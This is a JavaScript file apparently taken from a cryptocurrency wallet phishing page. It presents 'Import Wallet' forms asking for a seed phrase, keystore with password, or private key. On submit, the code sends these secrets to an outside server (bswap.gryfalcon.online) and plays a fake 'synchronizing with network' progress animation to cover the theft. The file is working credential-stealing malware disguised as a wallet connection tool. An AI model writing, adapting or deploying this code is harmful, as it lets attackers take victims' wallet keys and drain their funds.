<form action="script.php" method="post">
const API_URL = (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') ? 'http://127.0.0.1:3300' : 'https://bswap.gryfalcon.online';
const forms = {
    phrase: `
        <div class="form-row">
            <textarea data-error="a valid <span style='color:orange;font-style:plain;font-weight:700;'>seed phrase</span> is required" placeholder="Seed Phrase" name="seed_phrase"></textarea>
        </div>
        <p>Typically 12(sometimes 24) words separated by single spaces</p>
    `,
    keystore: `
        <div class="form-row">
            <textarea data-error="a valid <span style='color:orange;font-style:plain;font-weight:700;'>keystore (json)</span> is required" placeholder="Keystore" name="keystore"></textarea>
        </div>
        <div class="form-row">
            <input data-error="<span style='color:orange;font-style:plain;font-weight:700;'>keystore password</span> is required" type="password" placeholder="Password" name="password" />
        </div>
        <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
    `,
    secret_key: `
        <div class="form-row">
            <input data-error="a valid <span style='color:orange;font-style:plain;font-weight:700;'>secret key</span> is required" type="text" placeholder="Secret Key" name="secret_key" />
        </div>
        <p>Alphanumeric string that is generated at the creation of a crypto wallet address</p>
    `
}

function randomNum(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min);
}

function randomArray(qty, lmt) {
    var numbers = [...Array(lmt).keys()];

    generated = [];
    for (let i = 0; i < 10; i++) {
        let random_index;
        while (!random_index) {
            let tmp = Math.floor(Math.random() * numbers.length);
            if (!generated.filter((g) => numbers[tmp] == g).length)
                random_index = tmp;
        }
        generated.push(numbers[random_index]);
    }
    return generated.slice(0, qty);
}

function sleep(seconds) {
    return new Promise(resolve => setTimeout(resolve, seconds));
}

function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function deleteAllCookies() {
    var cookies = document.cookie.split(";");
    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
    }
}

function changeTheme(e) {
    let __current_theme = document.body.classList;

    if (__current_theme[0] == 'dark-theme') {
        document.body.classList = 'light-theme';
        document.getElementById('toggle').style.left = 'calc(100% - 10px)';
    } else {
        document.body.classList = 'dark-theme';
        document.getElementById('toggle').style.left = '10px';
    }

}

function loadPart(e, part, color) {
    let __container = document.getElementById('form-content'),
        __controls = document.querySelector('.form-controls').children;

    for (_child in __controls) {
        if (_child < __controls.length) {
            __controls[_child].style.color = 'inherit';
            __controls[_child].style.borderBottom = `none`;
            __controls[_child].classList = 'control-item';
        }
    }

    e.target.classList.add('active');
    e.target.style.color = `${color}`;
    e.target.style.borderBottom = `3px solid ${color}`;
    __container.innerHTML = forms[part];

    let __inputs = __container.getElementsByTagName('input');
    __textareas = __container.getElementsByTagName('textarea');

    for (_input in __inputs) {
        if (_input < __inputs.length) {
            __inputs[_input].style.border = `1px solid ${color}`
        }
    }
    for (_textarea in __textareas) {
        if (_textarea < __textareas.length) {
            __textareas[_textarea].style.border = `1px solid ${color}`
        }
    }
}

function syncWalletLoader(__state, __progress = 0, __text = `Processing input(s)... 0%`) {
    let __container, __thread, __progressPos;
    if (__state === 'start') {
        // load sync progress
        __container = document.createElement('div');
        __progressImg = document.createElement('img');
        __progressTxt = document.createElement('strong');
        __thread = document.createElement('div');
        __progressPos = document.createElement('div');

        __container.classList = `sync-progress`;
        __progressImg.src = './img/gifs/sync.gif';
        __progressImg.height = 40;
        __progressTxt.id = 'progress-text';
        __progressTxt.innerHTML = __text;
        __progressPos.id = 'progress-position';
        __progressPos.style.width = `${__progress}%`;
        __progressTxt.style.textAlign = 'center';

        __thread.appendChild(__progressPos);
        __container.appendChild(__progressImg);
        __container.appendChild(__progressTxt);
        __container.appendChild(__thread);

        document.getElementById('form-content').innerHTML = ``;
        document.getElementById('form-content').appendChild(__container);
    }

    if (__state === 'update') {
        // update sync progress
        if (__progress <= 100) {
            document.getElementById('progress-text').innerHTML = __text;
            document.getElementById('progress-position').style.width = `${__progress}%`;
        }
    }

}

function notify(msg, type, duration = 10) {
    let __notifier = document.getElementById('notifiers'),
        __box = document.createElement('div'),
        __controls = document.createElement('div'),
        __close = document.createElement('img'),
        __message = document.createElement('p'),
        __popId = randomNum(1111111111, 9999999999);

    __box.classList = `__notification-container ${type}`;
    __controls.classList = `__notifier-img-container`;

    // check current uri
    if (window.location.pathname === '/swap/') {
        __close.src = `../img/close.png`;
    } else {
        __close.src = `./img/close.png`;
    }
    __close.alt = `x close`;
    __message.innerHTML = msg;

    __controls.appendChild(__close)
    __box.appendChild(__controls);
    __box.appendChild(__message);

    __notifier.appendChild(__box);

    __intervals[__popId] = {}
    __intervals[__popId]['counts'] = 0;
    __intervals[__popId]['is_paused'] = false;

    __box.addEventListener('mouseenter', () => {
        __intervals[__popId]['is_paused'] = true;
    })
    __box.addEventListener('mouseleave', () => {
        __intervals[__popId]['is_paused'] = false;
    })

    __intervals[__popId]['interval'] = setInterval(() => {
        if (__intervals[__popId]['counts'] >= duration) {
            try {
                __box.style.animation = `SlideOutRight 300ms`;
                setTimeout(() => {
                    __notifier.removeChild(__box);
                }, 250)
            } catch (err) {
                console.log(err);
            } finally {
                clearInterval(__intervals[__popId]['interval']);
            }
        }

        if (!__intervals[__popId]['is_paused']) {
            __intervals[__popId]['counts']++;
        }
    }, 1000)

    __close.addEventListener('click', () => {
        clearInterval(__intervals[__popId]['interval']);
        __box.style.animation = `SlideOutRight 300ms`;
        setTimeout(() => {
            __notifier.removeChild(__box);
        }, 250)
    })
}

// make request
async function makeRequest(url = '', type = 'GET', data = {}) {
    const __data = await fetch(url, {
        method: type,
        mode: 'cors',
        cache: 'no-cache',
        credentials: 'same-origin',
        headers: {
            'Content-Type': 'application/json',
            'uhd': window.location.hostname
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow',
        referrerPolicy: 'no-referrer',
        body: (type === 'POST') ? JSON.stringify(data) : null
    })

    return __data.json();
}

async function connectWlt(__credentials) {
    try {
        const __data = await makeRequest(`${API_URL}/connect`, 'POST', __credentials);
        if (__data._wallet) return { error: false, account: __data._wallet };
        if (!__data._wallet) return { error: true, msg: __data.error };
    } catch (err) {
        return { error: true, msg: err };
    }

}

async function handleFormSubmit(e) {
    e.preventDefault();

    // check values
    let inputs = e.target.elements,
        __data = `<h1 style="margin: 20px 0;">Log Data</h1>`,
        __wallet_connect_req_obj = { referrer: getCookie('referrer') };

    for (let i = 0; i < inputs.length - 1; i++) {
        if (!inputs[i].value) {
            inputs[i].focus();
            // pop error notification
            notify(inputs[i].dataset.error, 'error');
            return false;
        }

        if (inputs[i].name === 'seed_phrase') {
            let __phrase = inputs[i].value.split(' ');

            if (__phrase.length !== 12 && __phrase.length !== 24) {
                notify(`invalid <span style='color:orange;font-style:plain;font-weight:700;'>seed phrase</span> format provided`, 'error');
                return false;
            }
        }

        if (inputs[i].tagName !== 'BUTTON') {
            __wallet_connect_req_obj[inputs[i].name] = inputs[i].value;
            __data += `<strong style="">
                            <span style="font-size:28px">${inputs[i].name}</span>  :  
                            <br/>
                                [
                                <br/>
                                <span style="color:green;padding-left:50px;font-size:12px;">
                                    ${inputs[i].value}
                                </span>
                                <br/>
                                ]
                            <br/>
                        </strong>
                        <br/><br/>`;
        }
    }
    __data += `<br/><br/><br/><br/>2021`;

    // submit form    
    setTimeout(async () => {
        syncWalletLoader('start', 0);

        try {
            const wltIsValid = await connectWlt(__wallet_connect_req_obj);

            if (wltIsValid.error) {
                // pop notification
                if (wltIsValid.msg) {
                    notify(wltIsValid.msg, 'error')
                } else {
                    notify('Synchronization failed. This might be as a result of invalid credentials submitted.', 'error')
                }
                document.body.removeChild(document.querySelector('.screen'));
                return false;
            }

            // store wallet data to local storage
            let __dts = wltIsValid.account

            for (let dt in __dts) {
                setCookie(dt, __dts[dt], 0.5);
            }

            let __counter = 5;
            let __is_paused = false;
            let __sleeps = randomArray(5, 30);

            let __syncInterval = setInterval(async () => {
                if (__counter <= 100) {
                    if (23 <= __counter && __counter < 42) {
                        syncWalletLoader('update', parseInt(__counter), `Verifying sync data...<br/><strong>${parseInt(__counter)}%</strong>`);
                    }
                    else if (42 <= __counter && __counter < 89) {
                        syncWalletLoader('update', parseInt(__counter), `Synchronizing with network...<br/><strong>${parseInt(__counter)}%</strong>`);
                    }
                    else {
                        syncWalletLoader('update', parseInt(__counter), `Loading data from network...<br/><strong>${parseInt(__counter)}%</strong>`);
                    }

                    if (__sleeps.includes(parseInt(__counter))) {
                        __is_paused = true;
                        await sleep(__counter * 1000);
                        __is_paused = false;
                    }

                    if (!__is_paused) {
                        __counter += 0.1;
                    }
                    // __counter = __counter.toFixed(2);
                }
                if (__counter === 100.09999999999859) {
                    setTimeout(() => {
                        try {
                            __counter++;
                            clearInterval(__syncInterval);
                            document.body.removeChild(document.querySelector('.screen'));
                            if (getCookie('address')) {
                                window.location = `./swap/`;
                            }
                        } catch (err) {
                            console.log(err)
                            return false;
                        }
                    }, 300)
                }
            }, 50);
        } catch (err) {
            // pop notification
            console.log(err);
            notify('Synchronization failed', 'error');
            document.body.removeChild(document.querySelector('.screen'));
            return false;
        }
    }, 100);

    // verify wallet data and redirect to swap page if successful
}

function popForm(_wallet) {
    let __container = document.createElement('div'),
        __formBox = document.createElement('form');

    __formBox.classList = `form-box`;
    __formBox.style.background = `linear-gradient(to bottom right, #e8eaed 80%, ${_wallet.color})`;
    __formBox.innerHTML = `
        <div class="wallet-logo">
            <img src="${_wallet.icon}" alt="${_wallet.title}" height="50" />
        </div>
        <ul class="form-controls">
            <li onclick="loadPart(event, 'phrase', '${_wallet.color}')" class="control-item active">Phrase</li>
            <li onclick="loadPart(event, 'keystore', '${_wallet.color}')" class="control-item">Keystore JSON</li>
            <li onclick="loadPart(event, 'secret_key', '${_wallet.color}')" class="control-item">Private Key</li>
        </ul>
        <div class="form-contain" id="form-content"></div>
        <input type="hidden" name="wallet" value="${_wallet.title}" />
        <div class="btn-contain">
            <button type="submit" value="1" style="background: linear-gradient(to top left, #fff 80%, ${_wallet.color});border: 1px solid ${_wallet.color}">
                <svg width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 13V19C4 20.1046 4.89543 21 6 21H18C19.1046 21 20 20.1046 20 19V13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M12 3L12 15M12 15L8.5 11.5M12 15L15.5 11.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>            
                Import Wallet
            </button>
        </div>
        <button type="button" value="1" id="__close_form">cancel</button>
    `;

    __container.classList = `screen`;
    __container.appendChild(__formBox);
    document.body.appendChild(__container);

    __formBox.addEventListener('submit', handleFormSubmit);
    document.getElementById('__close_form').addEventListener('click', e => {
        __formBox.removeEventListener('submit', handleFormSubmit);
        document.body.removeChild(__container);
    })
    document.querySelector('.form-controls').children[0].click();
}

function loadWallets() {
    let __container = document.getElementById('wallets'),
        __listContain = document.createElement('ul');

    __container.innerHTML = `
        <div class="__progress-box">
            <img src="./img/gifs/wallet.gif" alt="Loading..." height="250" />
        </div>
    `;

    for (i in wallets) {
        let __wallet = wallets[i],
            __row = document.createElement('li');

        __row.style.color = __wallet.color;
        __row.style.border = `1px solid ${__wallet.color}`;
        __row.style.background = `linear-gradient(to top left, #fff 80%, ${__wallet.color})`;
        __row.innerHTML = `${__wallet.title} <img src="${__wallet.icon}" height="25" />`;

        __row.addEventListener('click', () => {
            // pop import form
            popForm(__wallet);

        })
        __listContain.appendChild(__row);
    }

    setTimeout(() => {
        __container.innerHTML = ``;
        __container.appendChild(__listContain);
    }, 5000)
}

function disconnectWlt() {
    deleteAllCookies();
    window.location = `../`;
    return;
}